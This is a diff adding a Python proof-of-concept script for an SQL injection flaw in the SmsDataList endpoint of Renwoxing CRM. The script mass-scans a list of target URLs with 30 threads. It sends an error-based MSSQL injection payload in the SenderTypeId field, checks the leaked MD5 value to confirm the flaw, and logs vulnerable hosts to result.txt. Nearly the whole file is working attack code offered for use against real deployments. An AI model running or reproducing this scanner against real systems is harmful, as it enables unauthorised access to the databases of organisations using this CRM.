@@ -1,0 +1,58 @@
+#任我行CRM SmsDataList SQL注入漏洞poc
+import argparse,json,requests,sys,re
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+def banner():
+    test="""
+
+
+██████╗ ███████╗███╗   ██╗██╗    ██╗ ██████╗ ██╗  ██╗██╗███╗   ██╗ ██████╗        ██████╗██████╗ ███╗   ███╗    
+██╔══██╗██╔════╝████╗  ██║██║    ██║██╔═══██╗╚██╗██╔╝██║████╗  ██║██╔════╝       ██╔════╝██╔══██╗████╗ ████║    
+██████╔╝█████╗  ██╔██╗ ██║██║ █╗ ██║██║   ██║ ╚███╔╝ ██║██╔██╗ ██║██║  ███╗█████╗██║     ██████╔╝██╔████╔██║    
+██╔══██╗██╔══╝  ██║╚██╗██║██║███╗██║██║   ██║ ██╔██╗ ██║██║╚██╗██║██║   ██║╚════╝██║     ██╔══██╗██║╚██╔╝██║    
+██║  ██║███████╗██║ ╚████║╚███╔███╔╝╚██████╔╝██╔╝ ██╗██║██║ ╚████║╚██████╔╝      ╚██████╗██║  ██║██║ ╚═╝ ██║    
+╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝        ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝    
+                                                                                                                
+"""
+    print(test)
+def main():
+    banner()
+    parer=argparse.ArgumentParser(description='This is Renwoxing CRM SmsDataList SQL injection vulnerability')
+    parer.add_argument('-u','--url',dest='url',type=str,help='Please enter your link')
+    parer.add_argument('-f','--file',dest='file',type=str,help='Please enter your file path')
+    ages=parer.parse_args()
+    if ages.url and not ages.file:
+        poc(ages.url)
+    elif ages.file and not ages.url:
+        url_list=[]
+        with open (ages.file,'r',encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip())
+        mp=Pool(30)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python {sys.argv[0]} -h")
+def poc(target):
+    payload = '/SMS/SmsDataList/?pageIndex=1&pageSize=30'
+    headers = {
+        'Content-Type':'application/x-www-form-urlencoded',
+    }
+    data = "Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000' and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI"
+    try:
+        res1=requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)
+        if res1.status_code == 200:
+            match = re.search(r"'(0x[a-fA-F0-9]+)'", res1.text)
+            if match and '0xe10adc3949ba59abbe56e057f20f883e' == match.group(1):
+                print(f"[+] {target} 存在漏洞 “{target+payload}”")
+                with open('result.txt', 'a', encoding='utf-8') as f:
+                    f.write(target + '\n')
+            else:
+                print(f"[-] {target} 没有漏洞 ")
+        else:
+            print(f"[-] {target} 没有漏洞 ")
+    except Exception as e:
+        print(f"Exception occurred: {e}")
+if __name__=='__main__':
+    main()
